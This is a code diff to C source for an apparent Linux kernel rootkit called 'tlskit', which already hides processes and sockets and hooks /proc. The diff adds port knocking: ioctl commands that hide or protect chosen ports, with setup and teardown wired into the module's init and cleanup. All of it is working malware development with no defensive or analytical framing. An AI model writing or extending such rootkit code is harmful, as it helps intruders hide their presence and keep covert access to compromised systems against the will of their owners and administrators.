@@ -15,8 +15,12 @@
 #include "process_hiding.h"
 #include "proc_hook.h"
 #include "socket_hiding.h"
+#include "port_knocking.h"
 
 static int cleanup(void *_data) {
+
+    /* Disable port knocking */
+    disable_port_knocking();
 
     /* Disable socket hiding */
     disable_socket_hiding();
@@ -56,6 +60,7 @@ static int cleanup(void *_data) {
 static long ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
 
     struct sockaddr_in addr;
+    struct hidden_port pk;
     int ret;
 
     switch (cmd) {
@@ -144,6 +149,23 @@ static long ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
             }
             return ret;
 
+        case RKCTL_HIDE_PORT:
+
+            /*
+             * Protect port
+             */
+            if (copy_from_user(&pk, (struct hidden_port *) arg, sizeof(struct hidden_port)) != 0) {
+                return -EINVAL;
+            }
+            return port_knocking_add(pk);
+
+        case RKCTL_UNHIDE_PORT:
+
+            /*
+             * Unprotect port
+             */
+            return port_knocking_rm((unsigned short) arg);
+
         default:
             return -ENOTTY;
     }
@@ -194,9 +216,15 @@ static int __init tlskit_init(void) {
         goto socket_failed;
     }
 
+    if (0 != enable_port_knocking()) {
+        goto port_knocking_failed;
+    }
+
     return 0;
 
 /* disable all the enabled functionality */
+port_knocking_failed:
+    disable_socket_hiding();
 socket_failed:
     disable_process_hiding();
 process_failed:
